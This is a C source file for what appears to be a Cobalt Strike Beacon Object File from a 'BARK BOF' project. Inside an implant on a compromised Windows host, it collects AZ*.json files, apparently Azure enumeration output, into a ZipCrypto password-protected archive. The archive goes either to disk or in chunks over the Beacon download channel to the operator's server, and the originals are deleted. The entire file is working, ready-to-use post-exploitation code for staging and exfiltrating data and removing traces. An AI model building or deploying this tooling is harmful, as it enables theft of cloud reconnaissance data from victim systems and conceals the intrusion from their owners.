/*
 * zip_collect.c — BARK BOF
 * Collect all AZ*.json files into a single password-protected ZIP, then
 * delete the originals.
 *
 * Args : password, [label], [pattern]
 *   password : ZIP password (ZipCrypto / PKWARE traditional encryption)
 *   label    : tag for the output filename  (default: collect)
 *   pattern  : glob for files to collect   (default: .\\AZ*.json)
 *
 * Output: bark_{label}_{ts}.zip
 *
 * The ZIP uses PKWARE / ZipCrypto encryption (general-purpose-bit-flag
 * 0x0001).  Every standard tool can extract it with the password:
 *
 *     unzip -P <password>     output.zip
 *     7z   x  -p<password>   output.zip
 *     Windows Explorer        (right-click -> Extract All, prompts for pwd)
 *
 * Note: ZipCrypto is the legacy ZIP password format.  For stronger
 * confidentiality, use 7-Zip to re-encrypt with AES-256 after extracting.
 *
 * Author : BARK BOF project
 * License: GPLv3
 */

#include <windows.h>
#include <winhttp.h>
#include "../../include/beacon.h"
#include "../../include/http_utils.h"

/* ================================================================
 * Additional Win32 imports
 * ================================================================ */
WINBASEAPI HANDLE WINAPI KERNEL32$FindFirstFileA(
    LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData);
WINBASEAPI BOOL   WINAPI KERNEL32$FindNextFileA(
    HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData);
WINBASEAPI BOOL   WINAPI KERNEL32$FindClose(HANDLE hFindFile);
WINBASEAPI BOOL   WINAPI KERNEL32$ReadFile(
    HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead,
    LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
WINBASEAPI DWORD  WINAPI KERNEL32$GetFileSize(
    HANDLE hFile, LPDWORD lpFileSizeHigh);
WINBASEAPI BOOL   WINAPI KERNEL32$DeleteFileA(LPCSTR lpFileName);

/* ADVAPI32: CryptGenRandom for the ZipCrypto 12-byte random header */
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptAcquireContextA(
    HCRYPTPROV *phProv, LPCSTR szContainer, LPCSTR szProvider,
    DWORD dwProvType, DWORD dwFlags);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptReleaseContext(
    HCRYPTPROV hProv, DWORD dwFlags);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CryptGenRandom(
    HCRYPTPROV hProv, DWORD dwLen, BYTE *pbBuffer);

#ifndef PROV_RSA_AES
#define PROV_RSA_AES        24
#endif
#ifndef CRYPT_VERIFYCONTEXT
#define CRYPT_VERIFYCONTEXT 0xF0000000UL
#endif

/* ================================================================
 * CRC-32
 * ================================================================ */
static DWORD crc32_update(DWORD crc, BYTE b) {
    DWORD c = (crc & 0xFFu) ^ (DWORD)b;
    int i;
    for (i = 0; i < 8; i++)
        c = (c >> 1) ^ (0xEDB88320u & (DWORD)(-(int)(c & 1u)));
    return (crc >> 8) ^ c;
}
static DWORD crc32_buf(const BYTE *data, DWORD len) {
    DWORD crc = 0xFFFFFFFFu, i;
    for (i = 0; i < len; i++) crc = crc32_update(crc, data[i]);
    return crc ^ 0xFFFFFFFFu;
}

/* ================================================================
 * ZipCrypto stream cipher (PKWARE traditional encryption)
 *
 * The stream cipher operates per-file entry: each JSON file inside
 * the ZIP is individually encrypted with ZipCrypto.  The user sees
 * one password-protected .zip; entering the password in any standard
 * tool extracts all files at once.
 * ================================================================ */
typedef struct { DWORD k0, k1, k2; } ZcState;

static void zc_update(ZcState *s, BYTE c) {
    s->k0 = crc32_update(s->k0, c);
    s->k1 = (s->k1 + (s->k0 & 0xFFu)) * 134775813u + 1u;
    s->k2 = crc32_update(s->k2, (BYTE)((s->k1 >> 24) & 0xFFu));
}
static BYTE zc_stream(ZcState *s) {
    WORD t = (WORD)((s->k2 & 0xFFFFu) | 2u);
    return (BYTE)((((DWORD)t * (DWORD)(t ^ 1u)) >> 8) & 0xFFu);
}
static void zc_init(ZcState *s, const char *password) {
    s->k0 = 0x12345678u;
    s->k1 = 0x23456789u;
    s->k2 = 0x34567890u;
    while (*password) { zc_update(s, (BYTE)*password++); }
}

/* ================================================================
 * ZIP little-endian writers + DOS time/date
 * ================================================================ */
static void put16(BYTE *p, WORD v)  { p[0]=(BYTE)v; p[1]=(BYTE)(v>>8); }
static void put32(BYTE *p, DWORD v) {
    p[0]=(BYTE)v; p[1]=(BYTE)(v>>8);
    p[2]=(BYTE)(v>>16); p[3]=(BYTE)(v>>24);
}
static WORD dos_time(const SYSTEMTIME *st) {
    return (WORD)(((st->wHour & 0x1Fu) << 11) |
                  ((st->wMinute & 0x3Fu) << 5) |
                  ((st->wSecond / 2u) & 0x1Fu));
}
static WORD dos_date(const SYSTEMTIME *st) {
    WORD y = (WORD)((st->wYear > 1980) ? (st->wYear - 1980) : 0);
    return (WORD)(((y & 0x7Fu) << 9) | ((st->wMonth & 0x0Fu) << 5) | (st->wDay & 0x1Fu));
}

/* ================================================================
 * File entry
 * ================================================================ */
#define MAX_COLLECT_FILES 256

typedef struct {
    char   name[260];
    BYTE  *data;
    DWORD  size;
    DWORD  crc;
} FileEntry;

/* g_use_download values for the final ZIP:
 *   0 = save on target disk
 *   1 = queue in-memory BeaconDownload chunks
 *
 * Large single-buffer BeaconDownload transfers have been observed to report
 * completion while corrupting the tail.  Each part stays below the conservative
 * C2 limit, and Beacon copies each part before the BOF buffer is released.
 */


/* ZIP delivery needs an explicit success result because originals must not be
 * deleted when a disk write is partial or Beacon rejects the download. */
static BOOL DeliverZipOutput(const char *filename, const BYTE *buf, DWORD len) {
    if (g_use_download == 1) {
        DWORD offset = 0;
        DWORD part = 0;
        DWORD parts = (len / BARK_DOWNLOAD_CHUNK) +
            ((len % BARK_DOWNLOAD_CHUNK) != 0 ? 1u : 0u);
        char partName[340];

        while (offset < len) {
            DWORD partLen = len - offset;
            if (partLen > BARK_DOWNLOAD_CHUNK) partLen = BARK_DOWNLOAD_CHUNK;
            MSVCRT$sprintf_s(partName, sizeof(partName),
                "%s.part%03lu", filename, (unsigned long)part);
            if (!BeaconDownload(partName, (const char *)(buf + offset), partLen)) {
                BeaconPrintf(CALLBACK_ERROR,
                    "[-] BeaconDownload rejected %s (%lu bytes)\n",
                    partName, (unsigned long)partLen);
                return FALSE;
            }
            offset += partLen;
            part++;
        }
        BeaconPrintf(CALLBACK_OUTPUT,
            "[+] Queued chunked ZIP %s (parts=%lu, bytes=%lu, chunk=%lu); wait for all download-complete events\n",
            filename, (unsigned long)parts, (unsigned long)len,
            (unsigned long)BARK_DOWNLOAD_CHUNK);
        return TRUE;
    }

    HANDLE h = KERNEL32$CreateFileA(filename,
        GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] CreateFile %s failed (LastError=%lu)\n",
            filename, KERNEL32$GetLastError());
        return FALSE;
    }

    DWORD written = 0;
    BOOL writeOk = KERNEL32$WriteFile(h, buf, len, &written, NULL);
    DWORD writeError = writeOk ? ERROR_SUCCESS : KERNEL32$GetLastError();
    KERNEL32$CloseHandle(h);
    if (!writeOk || written != len) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] Partial write to %s (%lu/%lu bytes, LastError=%lu)\n",
            filename, (unsigned long)written, (unsigned long)len,
            (unsigned long)writeError);
        return FALSE;
    }

    BeaconPrintf(CALLBACK_OUTPUT,
        "[+] Saved to %s (%lu bytes)\n", filename, (unsigned long)len);
    return TRUE;
}

/* ================================================================
 * go() — entry point
 * ================================================================ */
void go(char *args, int alen)
{
    datap  parser;
    char  *password = NULL;
    char  *label    = NULL;
    char  *pattern  = NULL;

    BeaconDataParse(&parser, args, alen);
    password = BeaconDataExtract(&parser, NULL);
    label    = BeaconDataExtract(&parser, NULL);
    pattern  = BeaconDataExtract(&parser, NULL);
    g_use_download = BeaconDataInt(&parser);

    if (!password || MSVCRT$strlen(password) == 0) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] Usage: bark_zip_collect <password> [label] [pattern]\n"
            "    password : ZIP password (any standard tool will prompt for it)\n"
            "    label    : tag for the output filename  (default: collect)\n"
            "    pattern  : glob for files to collect   (default: .\\AZ*.json)\n");
        return;
    }
    if (!label   || MSVCRT$strlen(label)   == 0) label   = "collect";
    if (!pattern || MSVCRT$strlen(pattern) == 0) pattern = ".\\AZ*.json";

    /* --- Phase 1: enumerate matching files --- */
    static FileEntry entries[MAX_COLLECT_FILES];
    int count = 0;
    int i;

    WIN32_FIND_DATAA fd;
    HANDLE hFind = KERNEL32$FindFirstFileA(pattern, &fd);
    if (hFind == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[*] bark_zip_collect: no files matching %s\n", pattern);
        return;
    }
    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
        if (count >= MAX_COLLECT_FILES) {
            BeaconPrintf(CALLBACK_ERROR,
                "[-] Too many files (max %d); remaining skipped.\n",
                MAX_COLLECT_FILES);
            break;
        }

        HANDLE hf = KERNEL32$CreateFileA(fd.cFileName,
            GENERIC_READ, FILE_SHARE_READ, NULL,
            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hf == INVALID_HANDLE_VALUE) continue;

        DWORD fsize = KERNEL32$GetFileSize(hf, NULL);
        if (fsize == INVALID_FILE_SIZE || fsize == 0) {
            KERNEL32$CloseHandle(hf); continue;
        }

        BYTE *buf = (BYTE *)HAlloc(fsize);
        if (!buf) { KERNEL32$CloseHandle(hf); continue; }

        DWORD nread = 0;
        if (!KERNEL32$ReadFile(hf, buf, fsize, &nread, NULL) || nread != fsize) {
            HFree(buf); KERNEL32$CloseHandle(hf); continue;
        }
        KERNEL32$CloseHandle(hf);

        MSVCRT$strncpy(entries[count].name, fd.cFileName, 259);
        entries[count].name[259] = '\0';
        entries[count].data = buf;
        entries[count].size = fsize;
        entries[count].crc  = crc32_buf(buf, fsize);
        count++;
    } while (KERNEL32$FindNextFileA(hFind, &fd));
    KERNEL32$FindClose(hFind);

    if (count == 0) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[*] bark_zip_collect: no readable files matching %s\n", pattern);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] bark_zip_collect: found %d file(s), building ZIP...\n", count);

    /* --- Phase 2: calculate total ZIP size ---
     * Each entry: LFH(30+fnLen) + ZipCrypto header(12) + data + CDH(46+fnLen)
     * Plus EOCD(22) */
    ULONGLONG totalSize64 = 22;
    for (i = 0; i < count; i++) {
        DWORD fnLen = (DWORD)MSVCRT$strlen(entries[i].name);
        totalSize64 += 30ULL + fnLen + 12ULL + entries[i].size;
        totalSize64 += 46ULL + fnLen;
    }
    if (totalSize64 > 0xFFFFFFFFULL) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] ZIP would exceed the 4 GiB non-ZIP64 limit\n");
        goto cleanup;
    }
    DWORD totalSize = (DWORD)totalSize64;

    BYTE *zipBuf = (BYTE *)HAlloc(totalSize);
    if (!zipBuf) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Out of memory (%lu bytes)\n",
            (unsigned long)totalSize);
        goto cleanup;
    }

    /* Acquire crypto context for CryptGenRandom (ZipCrypto headers) */
    HCRYPTPROV hProv = 0;
    if (!ADVAPI32$CryptAcquireContextA(&hProv, NULL, NULL,
            PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] CryptAcquireContext failed (LastError=%lu)\n",
            KERNEL32$GetLastError());
        HFree(zipBuf);
        goto cleanup;
    }

    SYSTEMTIME st;
    KERNEL32$GetLocalTime(&st);
    WORD dt = dos_time(&st), dd = dos_date(&st);

    /* --- Phase 3: Local File Headers + ZipCrypto-encrypted data --- */
    BYTE *p = zipBuf;
    static DWORD lfhOffsets[MAX_COLLECT_FILES];

    for (i = 0; i < count; i++) {
        lfhOffsets[i] = (DWORD)(p - zipBuf);
        DWORD fnLen  = (DWORD)MSVCRT$strlen(entries[i].name);
        DWORD encSize = 12 + entries[i].size;  /* ZipCrypto header + data */

        /* Local File Header */
        put32(p, 0x04034B50u); p += 4;
        put16(p, 20);          p += 2;   /* version needed */
        put16(p, 0x0001u);     p += 2;   /* flag: encrypted */
        put16(p, 0);           p += 2;   /* compression: STORE */
        put16(p, dt);          p += 2;
        put16(p, dd);          p += 2;
        put32(p, entries[i].crc);   p += 4;
        put32(p, encSize);          p += 4;   /* compressed size */
        put32(p, entries[i].size);  p += 4;   /* uncompressed size */
        put16(p, (WORD)fnLen); p += 2;
        put16(p, 0);           p += 2;   /* extra field length */
        MSVCRT$memcpy(p, entries[i].name, fnLen); p += fnLen;

        /* 12-byte random encryption header (last byte = CRC high byte) */
        BYTE randHdr[12];
        ADVAPI32$CryptGenRandom(hProv, 11, randHdr);
        randHdr[11] = (BYTE)((entries[i].crc >> 24) & 0xFFu);

        /* Initialise ZipCrypto with the password and encrypt header + data */
        ZcState zs;
        zc_init(&zs, password);

        DWORD j;
        for (j = 0; j < 12; j++) {
            BYTE c = randHdr[j];
            *p++ = (BYTE)(c ^ zc_stream(&zs));
            zc_update(&zs, c);
        }
        for (j = 0; j < entries[i].size; j++) {
            BYTE c = entries[i].data[j];
            *p++ = (BYTE)(c ^ zc_stream(&zs));
            zc_update(&zs, c);
        }
    }

    /* --- Phase 4: Central Directory --- */
    BYTE *cdStart = p;
    for (i = 0; i < count; i++) {
        DWORD fnLen  = (DWORD)MSVCRT$strlen(entries[i].name);
        DWORD encSize = 12 + entries[i].size;

        put32(p, 0x02014B50u); p += 4;
        put16(p, 20);          p += 2;
        put16(p, 20);          p += 2;
        put16(p, 0x0001u);     p += 2;   /* encrypted */
        put16(p, 0);           p += 2;   /* STORE */
        put16(p, dt);          p += 2;
        put16(p, dd);          p += 2;
        put32(p, entries[i].crc);   p += 4;
        put32(p, encSize);          p += 4;
        put32(p, entries[i].size);  p += 4;
        put16(p, (WORD)fnLen); p += 2;
        put16(p, 0);           p += 2;   /* extra */
        put16(p, 0);           p += 2;   /* comment */
        put16(p, 0);           p += 2;   /* disk start */
        put16(p, 0);           p += 2;   /* internal attrs */
        put32(p, 0);           p += 4;   /* external attrs */
        put32(p, lfhOffsets[i]); p += 4;
        MSVCRT$memcpy(p, entries[i].name, fnLen); p += fnLen;
    }
    DWORD cdLen = (DWORD)(p - cdStart);
    DWORD cdOff = (DWORD)(cdStart - zipBuf);

    /* --- Phase 5: End of Central Directory --- */
    put32(p, 0x06054B50u); p += 4;
    put16(p, 0);           p += 2;
    put16(p, 0);           p += 2;
    put16(p, (WORD)count); p += 2;
    put16(p, (WORD)count); p += 2;
    put32(p, cdLen);  p += 4;
    put32(p, cdOff);  p += 4;
    put16(p, 0);      p += 2;

    DWORD zipLen = (DWORD)(p - zipBuf);

    ADVAPI32$CryptReleaseContext(hProv, 0);
    hProv = 0;

    /* Refuse to deliver or delete originals unless the in-memory archive has
     * the exact predicted length and both required boundary signatures. */
    BYTE *eocd = zipBuf + zipLen - 22;
    if (zipLen != totalSize ||
        zipBuf[0] != 0x50 || zipBuf[1] != 0x4B ||
        zipBuf[2] != 0x03 || zipBuf[3] != 0x04 ||
        eocd[0] != 0x50 || eocd[1] != 0x4B ||
        eocd[2] != 0x05 || eocd[3] != 0x06) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] Internal ZIP validation failed (%lu/%lu bytes); originals retained\n",
            (unsigned long)zipLen, (unsigned long)totalSize);
        HFree(zipBuf);
        goto cleanup;
    }

    /* --- Phase 6: deliver ZIP to disk or Beacon's download queue --- */
    char zipName[300];
    MSVCRT$sprintf_s(zipName, sizeof(zipName),
        ".\\bark_%s_%04u%02u%02u_%02u%02u%02u.zip",
        label,
        (unsigned)st.wYear, (unsigned)st.wMonth, (unsigned)st.wDay,
        (unsigned)st.wHour, (unsigned)st.wMinute, (unsigned)st.wSecond);

    BOOL outputOk = DeliverZipOutput(zipName, zipBuf, zipLen);
    /* BeaconDownload copies each part synchronously; release the archive
     * buffer once all parts have been queued. */
    HFree(zipBuf);
    if (!outputOk) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] ZIP delivery failed; original JSON files were retained\n");
        goto cleanup;
    }

    if (g_use_download == 1) {
        BeaconPrintf(CALLBACK_OUTPUT,
        "[+] bark_zip_collect: queued %s (%lu bytes, %d entries)\n"
        "    ZIP parts will be reassembled locally after all download-complete events.\n"
        "    The completed local file must be exactly %lu bytes.\n",
        zipName, (unsigned long)zipLen, count, (unsigned long)zipLen);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT,
        "[+] bark_zip_collect: saved %s (%lu bytes, %d entries)\n",
        zipName, (unsigned long)zipLen, count);
    }
    BeaconPrintf(CALLBACK_OUTPUT,
        "    Extract with:  unzip -P %s %s\n"
        "                   7z x -p%s %s\n"
        "                   Windows Explorer -> Extract All (prompts for password)\n",
        password, zipName, password, zipName);

    /* --- Phase 7: delete originals --- */
    {
        int deleted = 0;
        for (i = 0; i < count; i++) {
            if (KERNEL32$DeleteFileA(entries[i].name)) deleted++;
        }
        BeaconPrintf(CALLBACK_OUTPUT,
            "[+] bark_zip_collect: deleted %d/%d original file(s)\n",
            deleted, count);
    }

cleanup:
    for (i = 0; i < count; i++) {
        if (entries[i].data) { HFree(entries[i].data); entries[i].data = NULL; }
    }
    if (hProv) ADVAPI32$CryptReleaseContext(hProv, 0);
}
